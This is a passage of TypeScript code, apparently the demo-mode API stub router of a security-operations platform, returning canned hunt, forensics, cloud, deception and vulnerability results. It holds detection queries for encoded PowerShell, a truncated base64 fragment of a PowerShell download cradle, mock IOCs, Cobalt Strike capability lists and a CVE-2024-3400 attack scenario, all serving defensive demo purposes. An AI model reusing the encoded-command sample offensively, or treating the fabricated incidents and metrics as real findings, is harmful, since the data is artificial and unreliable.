      message: 'Emergency GPO pushed: re-enabled Defender, audit logging, disabled backdoor account',
      details: { action: 'remediation_gpo', gpo: 'EmergencyRestore', disabled_accounts: ['xcsupport'], pushed_by: 'soc-admin' } },
    { id: 1040, agent_id: 3, hostname: 'dc-01', event_type: 'alert', severity: 'info', created_at: t(0, 9, 15),
      message: 'ALERT RESOLVED: Domain Compromise — containment verified, investigation ongoing (INC-2026-0714)',
      details: { alert_id: 5523, resolved_by: 'soc-admin', resolution: 'contained', ticket: 'INC-2026-0714' } },
  ];

  return events.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
})();

// ── main router ───────────────────────────────────────────────────────────────

export function demoRoute(
  path:   string,
  method: string,
  sp:     URLSearchParams,
  body?:  string,
): { data: unknown; status: number } {
  const p = path.replace(/^\/api/, '');

  // WebSocket ticket — fake it so the WS flow doesn't show a 403 toast
  if (p === '/ws/ticket') return ok({ ticket: 'demo-ws-ticket-noop' });

  // ── Threat Hunt Enterprise POST stubs ────────────────────────────────────────
  if (method === 'POST' && p === '/threat-hunt')            return ok({ id: Date.now() % 1000 + 100 });
  if (method === 'POST' && p === '/threat-hunt/ai')         return ok({ suggestions: [{ name: 'Living-off-the-Land Binaries Hunt', category: 'ttp', hypothesis: 'Attackers may be abusing trusted Windows binaries to execute malicious code.', query_type: 'process', query_text: 'wmic.exe certutil.exe', mitre_techniques: 'T1218', priority: 'high' }], improved_hypothesis: 'An attacker with initial access may use encoded PowerShell commands to download and execute additional payloads while evading signature-based detection.', objective: 'Identify PowerShell execution with base64-encoded commands', expected_findings: 'powershell.exe with -EncodedCommand or -enc flags', success_criteria: 'Find >0 encoded PS invocations not tied to approved scripts', kql_query: 'process_name:"powershell.exe" AND cmdline:(*EncodedCommand* OR *-enc*)', executive_summary: 'Hunt analysis complete. 3 high-confidence indicators of compromise identified across 2 hosts.', key_findings: ['WORKSTATION-01: Encoded PS execution at 14:23', 'SRV-02: LSASS access by non-system process'], recommended_actions: ['Isolate WORKSTATION-01 for forensics', 'Review all PowerShell event logs'], next_hunts: [{ name: 'Follow-up: Persistence via Registry Run Keys', rationale: 'PS execution often followed by persistence', priority: 'high', mitre_technique: 'T1547.001', category: 'ttp' }] });
  if (method === 'POST' && p === '/threat-hunt/export')     return ok({ id: 1, name: 'Demo Hunt', category: 'ttp', mitre_techniques: 'T1059.001', hypothesis: 'Demo hypothesis', query_text: 'powershell', hit_count: 14, run_count: 8 });
  if (method === 'POST' && p === '/threat-hunt/response')   return ok({ queued: true, action: 'open_incident', target: 'WORKSTATION-01', message: "Response action 'open_incident' queued for target 'WORKSTATION-01'" });
  if (method === 'POST' && p.match(/^\/threat-hunt\/\d+\/execute$/))  return ok({ hunt_id: 1, hunt_name: 'Demo Hunt', hits: 3, status: 'completed' });
  if (method === 'POST' && p.match(/^\/threat-hunt\/\d+\/schedule$/)) return ok({ ok: true });
  if (method === 'POST' && p.match(/^\/threat-hunt\/\d+\/comment$/))  return ok({ id: Date.now() });
  if (method === 'PATCH' && p.match(/^\/threat-hunt\/\d+$/))          return ok({ ok: true });
  if (method === 'DELETE' && p.match(/^\/threat-hunt\/\d+$/))         return ok({ ok: true });
  if (method === 'POST' && p.match(/^\/threat-hunt\/findings\/\d+\/ack$/)) return ok({ ok: true });

  // ── Hunt enterprise POST stubs (search/analysis — no state mutation) ────────
  if (method === 'POST' && p === '/hunt/ai')       return ok({ kql: 'source="endpoint" | where process_name contains "powershell"', explanation: 'Searches for PowerShell execution across all endpoints.', alternative_queries: ['event_type="process_creation" | where parent_process_name contains "office"'], recommended_actions: ['Investigate flagged hosts', 'Cross-reference with YARA matches'], sigma_rule: 'title: PowerShell Execution\nstatus: experimental\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith: powershell.exe\n  condition: selection', summary: 'Hunt completed. 3 high-confidence PowerShell-based C2 indicators found across 2 hosts.' });
  if (method === 'POST' && p === '/hunt/ioc')      return ok({ ioc_type: 'ip', value: '185.220.101.47', time_range: '24h', log_hits: [{ source: 'syslog', hostname: 'srv-02', message: 'Connection to 185.220.101.47:443 established', timestamp: new Date().toISOString(), agent_id: 1 }], alert_hits: [{ rule_name: 'C2 Communication Detected', hostname: 'srv-02', severity: 'critical', timestamp: new Date().toISOString() }], conn_hits: [{ hostname: 'srv-02', remote_addr: '185.220.101.47:443', state: 'ESTABLISHED', timestamp: new Date().toISOString() }], total_hits: 3 });
  if (method === 'POST' && p === '/hunt/ttp')      return ok({ ttp: 'powershell', name: 'PowerShell Execution', mitre: 'T1059.001', tactic: 'Execution', log_hits: [{ hostname: 'WORKSTATION-01', source: 'sysmon', message: 'powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', timestamp: new Date().toISOString(), agent_id: 2 }], alert_hits: [], total_hits: 1, time_range: '24h' });
  if (method === 'POST' && p === '/hunt/actor')    return ok({ actor: 'APT29', ioc_hits: [], alert_hits: [], total_hits: 0, time_range: '7d' });
  if (method === 'POST' && p === '/hunt/export')   return ok({ id: 1, name: 'Demo Hunt', status: 'completed', kql_query: 'source=*', analyst: 'analyst-1', hit_count: 5, severity: 'high', notes: '', started_at: new Date().toISOString() });
  if (method === 'POST' && p === '/hunt/notebook') return ok({ id: Date.now() });
  if (method === 'DELETE' && p.startsWith('/hunt/notebook/')) return ok({ ok: true });
  if (method === 'POST' && p === '/hunt/response') return ok({ queued: true, action: 'isolate_host', target: 'WORKSTATION-01', message: "Response action 'isolate_host' queued for target 'WORKSTATION-01'" });

  // ── DFIR Enterprise — mutation stubs ──────────────────────────────────────
  if (method === 'POST' && p === '/dfir/investigations')   return ok({ id: 101, investigation_id: 'INV-9999-00101' });
  if (method === 'PATCH' && /^\/dfir\/investigations\/\d+$/.test(p))   return ok({ ok: true });
  if (method === 'DELETE' && /^\/dfir\/investigations\/\d+$/.test(p))  return ok({ ok: true });
  if (method === 'POST' && /^\/dfir\/investigations\/\d+\/collect$/.test(p))
    return ok({ task_id: 1, evidence_count: 4, evidence_ids: [1, 2, 3, 4], host: 'WORKSTATION-01', artifacts: ['processes', 'connections', 'event_logs', 'file_hashes'] });
  if (method === 'POST' && /^\/dfir\/investigations\/\d+\/ai$/.test(p))
    return ok({ executive_summary: 'Malicious PowerShell execution was detected originating from a phishing email attachment. The attacker established persistence via a scheduled task and moved laterally using SMB.', attack_chain: ['Phishing Email', 'Macro Execution', 'PowerShell Download Cradle', 'C2 Beacon', 'Lateral Movement', 'Data Staging'], root_cause: 'User opened a malicious Office macro document delivered via spearphishing email.', impact: 'Data exfiltration of ~2GB from finance share. Two hosts compromised.', recommendations: ['Block macro execution via Group Policy', 'Enable Attack Surface Reduction rules', 'Enforce MFA on all accounts', 'Review SMB share permissions'], next_steps: ['Isolate WORKSTATION-01', 'Reset credentials for affected users', 'Review email gateway logs', 'Run threat hunt for similar macros'] });
  if (method === 'POST' && /^\/dfir\/investigations\/\d+\/report$/.test(p))
    return ok({ report_type: 'dfir', title: 'DFIR Investigation Report', classification: 'TLP:GREEN', executive_summary: 'A targeted intrusion was detected affecting two Windows endpoints. Root cause was a malicious macro document delivered via email. The attacker established C2 via HTTPS beaconing and moved laterally using stolen credentials.', incident_overview: 'On 2026-07-10 at 08:14 UTC, SOC analysts detected anomalous PowerShell activity on WORKSTATION-01 following a phishing campaign. Investigation determined that the user had opened a malicious macro-enabled document.', timeline_summary: 'T+0 Phishing email received → T+4m Document opened → T+5m PowerShell executes → T+6m Registry persistence set → T+8m SMB lateral movement → T+22m Data exfiltration begins', technical_analysis: 'The PowerShell payload used AMSI bypass techniques and loaded a reflective DLL into memory. C2 communication was established over HTTPS to a domain registered 2 days prior to the attack.', evidence_summary: '12 evidence items collected across 2 hosts including memory dumps, network captures, and file system artifacts.', ioc_list: ['185.220.101.47', 'update-cdn-service[.]com', 'SHA256:e3b0c44298fc1c149afb...'], mitre_coverage: ['T1566.001', 'T1059.001', 'T1547.001', 'T1021.002', 'T1041'], impact_assessment: 'Medium business impact. Finance share accessed. No PII confirmed exfiltrated.', containment_steps: ['Isolated affected hosts', 'Blocked C2 IPs at firewall', 'Disabled compromised user accounts'], eradication_steps: ['Removed malicious scheduled task', 'Cleaned registry run keys', 'Reimaged WORKSTATION-01'], recovery_steps: ['Restored from clean backup', 'Reset all affected credentials', 'Applied patch KB5034441'], lessons_learned: ['Enforce macro execution policy via GPO', 'Improve phishing simulation coverage', 'Reduce alert-to-triage time from 45m to <15m'] });
  if (method === 'POST' && /^\/dfir\/investigations\/\d+\/response$/.test(p))
    return ok({ ok: true, queued: true, action: 'isolate_host', target: 'WORKSTATION-01', message: "Response action queued" });
  if (method === 'POST' && /^\/dfir\/investigations\/\d+\/timeline$/.test(p))
    return ok({ id: Date.now() % 10000 });
  if (method === 'POST' && /^\/dfir\/investigations\/\d+\/memory$/.test(p))
    return ok({ suspicious_processes: [{ name: 'svchost.exe', reason: 'Running from Temp directory, not System32', severity: 'critical', mitre: 'T1055' }, { name: 'rundll32.exe', reason: 'Unusual parent process: winword.exe', severity: 'high', mitre: 'T1218.011' }], injections: [{ process: 'notepad.exe', pid: 4812, indicator: 'Shellcode injected via VirtualAllocEx', confidence: 88 }], recommendations: ['Dump memory of svchost.exe (PID 4321)', 'Analyze rundll32.exe loaded DLLs', 'Check for LSASS access events'], executive_summary: 'Memory analysis identified 2 suspicious processes consistent with post-exploitation tooling. Code injection detected in notepad.exe.' });
  if (method === 'POST' && /^\/dfir\/investigations\/\d+\/notebook$/.test(p))
    return ok({ id: Date.now() % 10000 });
  if (method === 'DELETE' && /^\/dfir\/notebook\/\d+$/.test(p))
    return ok({ ok: true });
  if (method === 'POST' && /^\/dfir\/evidence\/\d+\/custody$/.test(p))
    return ok({ id: Date.now() % 10000 });
  if (method === 'POST' && p === '/dfir/file-analysis')
    return ok({ file_name: 'invoice_macro.xlsm', sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', md5: 'd41d8cd98f00b204e9800998ecf8427e', entropy: 6.84, file_type: 'Microsoft Excel Macro', is_pe: false, is_signed: false, packed: false, suspicious: true, threat_classification: 'Trojan.Macro.Agent', strings_of_interest: ['powershell -enc', 'cmd.exe /c', 'WScript.Shell', 'http://'], imports: [], exports: [], sections: [], mitre_techniques: ['T1566.001', 'T1059.001'], iocs: ['powershell -enc SQBFAFgA'], verdict: 'malicious', confidence: 94, recommendations: ['Block execution on all endpoints', 'Search for similar files via SHA256', 'Alert on WScript.Shell parent spawning PowerShell'] });
  if (method === 'POST' && p === '/dfir/malware-analysis')
    return ok({ hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', threat_name: 'Cobalt Strike Beacon', threat_family: 'CobaltStrike', threat_category: 'RAT/C2 Framework', confidence: 97, sandbox_verdict: 'malicious', yara_matches: [{ rule: 'HKTL_CobaltStrike_Beacon_Strings', tags: ['apt', 'c2'], description: 'Detects CobaltStrike beacon configuration strings' }], strings: ['ReflectiveDll', 'VirtualAllocEx', 'CreateRemoteThread', 'MSFEEDSSYNC'], imports: ['VirtualAlloc', 'WriteProcessMemory', 'CreateRemoteThread', 'LoadLibraryA'], packer: 'UPX 3.91', c2_domains: ['update-cdn-service.com', 'cdn-assets-global.net'], c2_ips: ['185.220.101.47', '104.21.84.133'], capabilities: ['Process injection', 'Keylogging', 'Screenshot capture', 'Lateral movement'], persistence: ['HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'], evasion: ['AMSI bypass', 'ETW patching', 'Sleep obfuscation'], mitre_techniques: [{ id: 'T1055', name: 'Process Injection', tactic: 'Defense Evasion' }, { id: 'T1071.001', name: 'Web Protocols', tactic: 'C2' }], threat_actors: ['APT29', 'FIN7'], campaigns: ['DarkSide Affiliate', 'Operation NightScout'], cves: [], vt_detections: 62, vt_total: 70, misp_events: [], recommendations: ['Block C2 domains at firewall', 'Hunt for beacon traffic on port 443', 'Search for UPX-packed binaries in Temp directories'], executive_summary: 'CobaltStrike beacon detected with high confidence (97%). Active C2 communication identified to known malicious infrastructure.' });

  // ── Cloud Security Enterprise — mutation stubs ────────────────────────────
  if (method === 'POST' && p === '/cloud/accounts')  return ok({ id: Date.now() % 100 + 10, ok: true });
  if (method === 'DELETE' && /^\/cloud\/accounts\/\d+$/.test(p)) return ok({ ok: true });
  if (method === 'PATCH' && /^\/cloud\/cspm\/findings\/\d+$/.test(p)) return ok({ ok: true });
  if (method === 'PATCH' && /^\/cloud\/drift\/\d+$/.test(p))         return ok({ ok: true });
  if (method === 'POST' && p === '/cloud/response') return ok({ ok: true, action: 'make_bucket_private', message: 'Action executed successfully' });
  if (method === 'POST' && p === '/cloud/report') return ok({ title: 'Cloud Security Executive Report', executive_summary: 'Your multi-cloud environment has 247 assets across AWS, Azure, and GCP. 12 critical findings require immediate attention, primarily around public S3 buckets, IAM privilege escalation paths, and unencrypted RDS instances. Active threat detection identified 3 suspicious API call patterns indicative of credential abuse.', key_findings: ['3 S3 buckets publicly accessible containing sensitive data', 'IAM role with AdministratorAccess unused for 6 months — privilege escalation risk', 'EC2 instance communicating with known C2 infrastructure (185.220.101.47)', 'RDS instance postgres-prod-01 lacks encryption at rest', 'Azure AD service principal with excessive permissions across 12 subscriptions'], risk_breakdown: { critical: 12, high: 28, medium: 47, low: 63 }, top_recommendations: [{ priority: 1, action: 'Make S3 buckets private immediately', estimated_effort: '1 hour' }, { priority: 2, action: 'Rotate compromised access keys', estimated_effort: '30 minutes' }, { priority: 3, action: 'Enable MFA on 8 IAM users', estimated_effort: '2 hours' }], metrics: { total_assets: 247, critical_findings: 12, public_assets: 18, iam_risks: 24, active_threats: 3 }, compliance_summary: 'CIS Benchmark: 76% pass rate. PCI DSS: 3 critical control failures. SOC 2: 8 control gaps identified.' });
  if (method === 'POST' && p === '/cloud/ai') return ok({ answer: 'This S3 bucket (corp-backups) was made public 3 hours ago, potentially exposing 2.4 GB of backup data including database dumps and configuration files with credentials. Immediate action required: restrict bucket ACL, enable Block Public Access, rotate any exposed credentials, and audit CloudTrail for access since the exposure began.', confidence: 94, related_resources: ['corp-backups S3 bucket', 'IAM role arn:aws:iam::123456789012:role/BackupRole', 'EC2 instance i-0a1b2c3d4e5f67890'], recommended_actions: ['Immediately enable Block Public Access on the S3 bucket', 'Rotate any credentials found in exposed backup files', 'Review CloudTrail for unauthorized access in the last 3 hours', 'Enable S3 access logging for forensic investigation'], additional_context: 'The bucket policy was modified by IAM user deploy-bot at 06:14 UTC via CLI, which may indicate a misconfigured CI/CD pipeline or compromised deploy credentials.' });

  // ── Deception Enterprise — mutation stubs ────────────────────────────────
  if (method === 'POST' && p === '/deception/decoys')      return ok({ id: Date.now() % 1000 + 200, ok: true });
  if (method === 'POST' && p === '/deception/deploy')      return ok({ created: 2, ok: true });
  if (method === 'POST' && p === '/deception/honeytokens') return ok({ id: Date.now() % 1000 + 300, ok: true });
  if (method === 'POST' && p === '/deception/watchlists')  return ok({ id: Date.now() % 1000 + 400, ok: true });
  if (method === 'POST' && p === '/deception/policies')    return ok({ id: Date.now() % 1000 + 500, ok: true });
  if (method === 'POST' && p === '/deception/response')    return ok({ ok: true, action: 'block_ip' });
  if (method === 'POST' && p === '/deception/report')      return ok({ title: 'Deception Engagement Report', executive_summary: 'During the reporting period, 7 deception assets were triggered by 3 unique attacker IPs. Campaign analysis indicates a targeted reconnaissance phase followed by lateral movement attempts.', key_findings: ['APT29-linked IP 185.220.101.47 triggered 4 decoys', 'Honeytoken credential used in AD authentication from 10.0.1.88', 'RDP honeypot hit 12 times in 2-hour window'], attack_timeline: [{ time: new Date(Date.now() - 7200000).toISOString(), event: 'Initial SSH brute-force on DECOY-LINUX-01' }, { time: new Date(Date.now() - 3600000).toISOString(), event: 'Honeytoken credential used in LDAP auth' }, { time: new Date(Date.now() - 1800000).toISOString(), event: 'RDP scan hit 3 honeypots in succession' }], mitre_coverage: ['T1110 - Brute Force', 'T1078 - Valid Accounts', 'T1021.001 - Remote Desktop Protocol', 'T1046 - Network Service Scanning'], recommendations: ['Block 185.220.101.47 at perimeter', 'Force password reset for compromised honeytoken accounts', 'Deploy additional honeypots in lateral movement paths'], metrics: { total_triggers: 23, campaigns: 2, decoys_deployed: 12, avg_dwell_time_hours: 4.2 } });
  if (method === 'POST' && p === '/deception/ai')          return ok({ summary: 'Attacker displayed systematic reconnaissance behavior targeting authentication services. High confidence this is an automated scan followed by targeted exploitation attempt.', confidence: 87, key_findings: ['Credential stuffing pattern detected', 'Sequential IP scanning across subnet', 'Same attacker pivoted to honeypot after initial scan'], attack_stage: 'Credential Access / Lateral Movement', threat_actor: 'Unknown (APT29-like TTPs)', evidence: ['185.220.101.47 in known threat actor range', 'Timing pattern matches automated tooling', 'Targeted admin accounts specifically'], recommended_actions: ['Immediate IP block at firewall', 'Hunt for similar patterns on real assets', 'Review AD auth logs for past 48h'], additional_decoys: ['Deploy fake MSSQL server on 10.0.1.50', 'Add more admin honeytoken accounts in AD'], soar_playbook: 'deception-response-playbook-v2' });
  if (method === 'PATCH' && /^\/deception\/decoys\/\d+$/.test(p)) return ok({ ok: true });
  if (method === 'DELETE' && /^\/deception\/decoys\/\d+$/.test(p))      return ok({ ok: true });
  if (method === 'DELETE' && /^\/deception\/honeytokens\/\d+$/.test(p)) return ok({ ok: true });
  if (method === 'DELETE' && /^\/deception\/watchlists\/\d+$/.test(p))  return ok({ ok: true });
  if (method === 'DELETE' && /^\/deception\/policies\/\d+$/.test(p))    return ok({ ok: true });

  // ── Suppression Enterprise — mutation stubs ──────────────────────────────
  if (method === 'POST' && p === '/sup/rules')                              return ok({ id: Date.now() % 10000 + 1, ok: true, approval_required: false });
  if (method === 'PATCH' && /^\/sup\/rules\/\d+$/.test(p))                 return ok({ ok: true });
  if (method === 'DELETE' && /^\/sup\/rules\/\d+$/.test(p))                return ok({ ok: true });
  if (method === 'POST' && /^\/sup\/rules\/\d+\/approve$/.test(p))         return ok({ ok: true });
  if (method === 'POST' && p === '/sup/preview')                            return ok({ estimated_alerts_affected: 1240, historical_matches: 4200, lookback_days: 30, impacted_assets: [{ hostname: 'BACKUP-SRV-01', alert_count: 2100, last_match: new Date(Date.now() - 2 * 3600000).toISOString() }, { hostname: 'BACKUP-SRV-02', alert_count: 1400, last_match: new Date(Date.now() - 3 * 3600000).toISOString() }, { hostname: 'WIN-LAPTOP-042', alert_count: 700, last_match: new Date(Date.now() - 6 * 3600000).toISOString() }], simulated_outcome: { alerts_per_day_before: 140, alerts_per_day_after: 0, analyst_hours_saved: 1.17, risk_assessment: 'low', false_negative_risk: 'very_low', recommendation: 'Safe to suppress. 0 confirmed incidents in 30-day history for matching alerts.' }, sample_matches: [{ alert_id: 'ALT-4821', detection: 'Backup Process — PowerShell Execution', asset: 'BACKUP-SRV-01', timestamp: new Date(Date.now() - 3600000).toISOString(), severity: 'medium' }, { alert_id: 'ALT-4799', detection: 'Backup Process — PowerShell Execution', asset: 'BACKUP-SRV-02', timestamp: new Date(Date.now() - 2 * 3600000).toISOString(), severity: 'medium' }] });
  if (method === 'POST' && p === '/sup/ai')                                 return ok({ recommendation: 'suppress', confidence_pct: 94, reasoning: 'This alert has triggered 4,200 times in the last 30 days with zero confirmed incidents. The noise-to-signal ratio is extremely high. This is a classic false positive from scheduled backup processes using PowerShell. Suppression during known backup windows (02:00–06:00 UTC) is recommended.', conditions_if_conditional: 'Limit to backup server asset group, during 02:00–06:00 UTC, process name matches veeam.exe or backup*.ps1', risk_if_suppressed: 'Low — alert has no incident correlation and is high volume; suppression risk is minimal', alternative: 'Lower severity to Informational instead of fully suppressing, preserving log retention for forensics', ai_analysis: 'Although this CVE is rated Medium by CVSS, it has a high EPSS score and is present on an internet-facing server. However, for this specific alert pattern — 4,200 triggers, 0 incidents, known backup process — suppression during the maintenance window is the correct operational decision.' });
  if (method === 'POST' && p === '/sup/report')                             return ok({ title: 'Suppression Report — July 2026', generated_at: new Date().toISOString(), classification: 'CONFIDENTIAL — INTERNAL', executive_summary: '12 active suppression rules reduced analyst alert volume by 92.3% this period. Estimated 650 analyst hours saved. 1 suppression rule flagged for review.', key_metrics: { active_rules: 12, alerts_suppressed: 12940, analyst_hours_saved: 647, false_positive_rate: '94.2%', rules_requiring_review: 1 }, top_rules: [{ rule: 'Backup Window Suppression', suppressed: 4200, incidents: 0, status: 'healthy' }, { rule: 'AV Scanner False Positive', suppressed: 972, incidents: 0, status: 'healthy' }], flagged_rules: [{ rule: 'Sysadmin Scheduled Tasks', suppressed: 1840, incidents: 1, issue: '1 suppressed alert later correlated with confirmed incident INC-2026-0412' }], recommendations: ['Review Sysadmin Scheduled Tasks rule — matched confirmed incident INC-2026-0412', '3 rules expire within 7 days — renew or let expire', 'Enable approval workflow for critical priority rules', 'Add Domain Controller exceptions to all full-suppress rules'] });

  // ── Vuln Queue Enterprise — mutation stubs ───────────────────────────────
  if (method === 'POST' && /^\/vq\/items\/\d+\/assign$/.test(p))       return ok({ ok: true });
  if (method === 'POST' && /^\/vq\/items\/\d+\/action$/.test(p))       return ok({ ok: true, status: 'in_progress' });
  if (method === 'POST' && /^\/vq\/items\/\d+\/verify$/.test(p))       return ok({ ok: true, pass: true });
  if (method === 'POST' && /^\/vq\/items\/\d+\/dependencies$/.test(p)) return ok({ id: 1, ok: true });
  if (method === 'POST' && p === '/vq/exceptions')                      return ok({ id: 1, ok: true });
  if (method === 'PATCH' && /^\/vq\/exceptions\/\d+$/.test(p))         return ok({ ok: true });
  if (method === 'DELETE' && /^\/vq\/exceptions\/\d+$/.test(p))        return ok({ ok: true });
  if (method === 'POST' && p === '/vq/bulk')                            return ok({ ok: true, affected: 3 });
  if (method === 'POST' && p === '/vq/ai')                              return ok({ recommendation: 'Apply the vendor-supplied patch to resolve this vulnerability.', cve_id: 'CVE-2024-3400', steps: ['Download patch from PAN-OS advisory PSIRT-2024-3400', 'Schedule 30-min maintenance window with Network Team', 'Take pre-patch configuration backup', 'Apply GlobalProtect patch during maintenance window', 'Verify GlobalProtect restarts correctly', 'Run targeted scan to confirm CVE-2024-3400 is resolved', 'Update queue item to Awaiting Verification'], estimated_effort: '2–4 hours including maintenance window', risks_if_delayed: 'Active exploitation likely within 24–72 hours. CISA KEV listing confirms real-world exploitation. Unauthenticated RCE on internet-facing VPN gateway is a critical scenario.', alternative_mitigations: ['Apply PAN-OS PSIRT temporary mitigation script', 'Temporarily disable GlobalProtect and switch to alternative VPN', 'Add WAF/IPS rule to block exploit payload pattern'], ai_analysis: 'CVE-2024-3400 is a critical unauthenticated OS command injection in PAN-OS GlobalProtect. EPSS score of 0.974 places it in the top 3% of CVEs by exploitation likelihood. CISA KEV listing confirms active exploitation in the wild. An internet-facing VPN gateway is the highest-risk attack surface possible. Although this CVE is rated Critical by CVSS, the combination of KEV listing, EPSS 97.4%, internet-facing asset, and weaponized public exploits makes this an immediate remediation priority — patch within 24 hours without exception.' });
  if (method === 'POST' && p === '/vq/report')                          return ok({ title: 'Remediation Status Report — July 2026', generated_at: new Date().toISOString(), classification: 'CONFIDENTIAL — INTERNAL', executive_summary: '12 active remediation tasks across 5 teams. 2 items are overdue. SLA compliance is 94.2% this period. Mean time to remediate is 8.4 days, down from 12.1 days last month.', key_metrics: { total_active: 12, overdue: 2, closed_this_period: 18, sla_compliance: '94.2%', mttr_days: 8.4 }, overdue_items: [{ queue_id: 'VQ-2026-001', cve: 'CVE-2024-3400', asset: 'VPN-GW-01', team: 'Network Team', days_overdue: 3 }, { queue_id: 'VQ-2026-006', cve: 'CVE-2021-44228', asset: 'EKS-CLUSTER-01', team: 'DevOps Team', days_overdue: 1 }], team_performance: [{ team: 'Network Team', closed: 2, avg_days: 6.2, sla_pct: 75 }, { team: 'Windows Team', closed: 3, avg_days: 4.1, sla_pct: 100 }], recommendations: ['Escalate VQ-2026-001 (CVE-2024-3400) to Network Team management — 3 days overdue', 'Schedule maintenance window for EKS-CLUSTER-01 Log4Shell remediation', 'Review SLA policy for Low severity — 88.6% compliance below target', 'Enable automatic assignment rules for Cloud Team findings'] });

  // ── Vulnerability Management Enterprise — mutation stubs ─────────────────
  if (method === 'POST' && p === '/vm/scans')                                    return ok({ id: 1, ok: true, status: 'running' });
  if (method === 'POST' && /^\/vm\/findings\/\d+\/action$/.test(p))              return ok({ ok: true });
  if (method === 'POST' && /^\/vm\/findings\/\d+\/verify$/.test(p))              return ok({ ok: true, verified_at: new Date().toISOString() });
  if (method === 'POST' && /^\/vm\/patches\/\d+\/action$/.test(p))               return ok({ ok: true });
  if (method === 'POST' && p === '/vm/exceptions')                               return ok({ id: 1, ok: true });
  if (method === 'PATCH' && /^\/vm\/exceptions\/\d+$/.test(p))                   return ok({ ok: true });
  if (method === 'DELETE' && /^\/vm\/exceptions\/\d+$/.test(p))                  return ok({ ok: true });
  if (method === 'POST' && p === '/vm/ai')                                       return ok({ risk_summary: 'CVE-2024-3400 is listed in the CISA KEV catalog and is present on an internet-facing VPN gateway, making it an immediate remediation priority regardless of CVSS score.', priority: 'immediate', priority_reason: 'CISA KEV listing + internet-facing asset + EPSS 0.974 indicate active exploitation', business_impact: 'Unauthenticated RCE on VPN gateway would give attacker full access to internal network — critical business risk.', recommended_action: 'Apply PAN-OS patch immediately. If patch window unavailable, disable GlobalProtect temporarily and switch to alternative VPN.', estimated_effort: '2-4 hours with 30-min maintenance window', attack_scenario: 'Attacker scans internet for PAN-OS GlobalProtect instances, sends crafted HTTP request to exploit CVE-2024-3400, achieves unauthenticated OS command execution as root, establishes persistence, pivots to internal network.', risk_factors: ['Internet-facing asset', 'CISA KEV listed — confirmed active exploitation in the wild', 'EPSS 0.974 — top 3% exploitation probability', 'Weaponized exploit publicly available (Metasploit module)', 'Critical asset criticality'], mitigating_factors: ['EDR agent deployed on host', 'Security monitoring active', 'Network IPS signatures deployed'] });
  if (method === 'POST' && p === '/vm/report')                                   return ok({ title: 'Vulnerability Management Executive Report — July 2026', generated_at: new Date().toISOString(), classification: 'CONFIDENTIAL — INTERNAL', executive_summary: 'The organization has 31 open vulnerabilities across 12 assets. 3 critical findings require immediate remediation.', key_metrics: { total_findings: 31, critical: 6, high: 12, patched_this_period: 24, sla_compliance: 82.3, mttr_days: 14.2, kev_findings: 3, overdue: 7 }, top_risks: [{ rank: 1, cve: 'CVE-2024-3400', asset: 'VPN-GW-01', cvss: 10.0, kev: true, status: 'open', days_open: 5 }, { rank: 2, cve: 'CVE-2024-21887', asset: 'VPN-GW-01', cvss: 9.1, kev: true, status: 'open', days_open: 14 }, { rank: 3, cve: 'CVE-2021-44228', asset: 'WEB-APP-01', cvss: 10.0, kev: true, status: 'open', days_open: 180 }], recommendations: ['Immediately patch CVE-2024-3400 on VPN-GW-01', 'Block SMB port 445 from internet — critical firewall misconfiguration', 'Renew portal.corp.local certificate — expired 3 days ago', 'Deploy automated patching for critical assets'] });

  // ── Approval Queue Enterprise — mutation stubs ───────────────────────────
  if (method === 'POST' && p === '/aq/queue')                                  return ok({ id: 1, approval_id: 'AQ-2026-000001', ok: true });
  if (method === 'POST' && /^\/aq\/queue\/\d+\/decision$/.test(p))             return ok({ ok: true });
  if (method === 'POST' && /^\/aq\/queue\/\d+\/delegate$/.test(p))             return ok({ ok: true });
  if (method === 'POST' && /^\/aq\/queue\/\d+\/emergency$/.test(p))            return ok({ ok: true });
  if (method === 'POST' && /^\/aq\/queue\/\d+\/comments$/.test(p))             return ok({ id: 99, ok: true });
  if (method === 'POST' && p === '/aq/policies')                               return ok({ id: 1, ok: true });
  if (method === 'PATCH' && /^\/aq\/policies\/\d+$/.test(p))                   return ok({ ok: true });
  if (method === 'DELETE' && /^\/aq\/policies\/\d+$/.test(p))                  return ok({ ok: true });
  if (method === 'POST' && p === '/aq/ai')                                     return ok({ risk_summary: 'This action will isolate a potentially compromised endpoint, preventing lateral movement.', business_impact: 'Medium — user loses network access for ~2-4 hours. No production services on this host.', recommendation: 'approve', reasons: ['Cobalt Strike C2 confirmed to known malicious IP', 'LSASS credential dump detected', 'Host is a workstation — manageable business impact', 'Isolation is reversible'], confidence: 94, mitre_context: 'T1055.012 Process Hollowing, T1003.001 LSASS Memory', suggested_conditions: ['Collect memory dump before isolation', 'Notify user manager', 'Verify backup approver available'] });
  if (method === 'POST' && p === '/aq/report')                                 return ok({ title: 'Approval Queue History Report — July 2026', generated_at: new Date().toISOString(), report_type: 'approval_history', classification: 'CONFIDENTIAL — INTERNAL', summary: '132 approval requests processed. 94.7% within SLA.', statistics: { total: 132, approved: 118, rejected: 12, emergency: 1, avg_time_min: 12.4, sla_compliance: 91.2 } });

  // ── Playbooks Enterprise — mutation stubs ────────────────────────────────
  if (method === 'POST' && p === '/pb/library')                              return ok({ id: 1, ok: true });
  if (method === 'PATCH' && /^\/pb\/library\/\d+$/.test(p))                 return ok({ ok: true });
  if (method === 'DELETE' && /^\/pb\/library\/\d+$/.test(p))                return ok({ ok: true });
  if (method === 'POST' && /^\/pb\/library\/\d+\/publish$/.test(p))         return ok({ ok: true, version: '1.2.0' });
  if (method === 'PATCH' && /^\/pb\/library\/\d+\/workflow$/.test(p))       return ok({ ok: true });
  if (method === 'POST' && /^\/pb\/library\/\d+\/execute$/.test(p))         return ok({ id: 1, execution_id: 'EX-2026-000001', ok: true });
